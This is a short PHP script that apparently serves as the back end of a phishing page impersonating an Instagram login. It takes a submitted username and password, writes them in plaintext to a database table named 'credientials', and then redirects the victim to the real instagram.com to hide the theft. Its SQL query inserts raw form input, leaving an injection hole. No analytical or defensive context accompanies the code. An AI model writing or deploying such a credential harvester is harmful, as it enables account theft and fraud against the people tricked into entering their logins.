<?php
session_start();
ob_start();
$host="localhost";
$username="root";
$pass="";
$dbname="GKchAE0n";
$tbl_name="credientials";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if ($conn) {
    $username=$_POST['username'];
	$password=$_POST['password'];

	$sql = "INSERT INTO credientials (username, password) VALUES ('$username', '$password')";
	if (mysqli_query($conn, $sql)) {
        	echo "New record created successfully";
	} else {
    		echo "Error: " . $sql . "<br>" . mysqli_error($conn);
	}

	mysqli_close($conn);
}

sleep(2);
header("location:https://instagram.com");
ob_end_flush();
?>
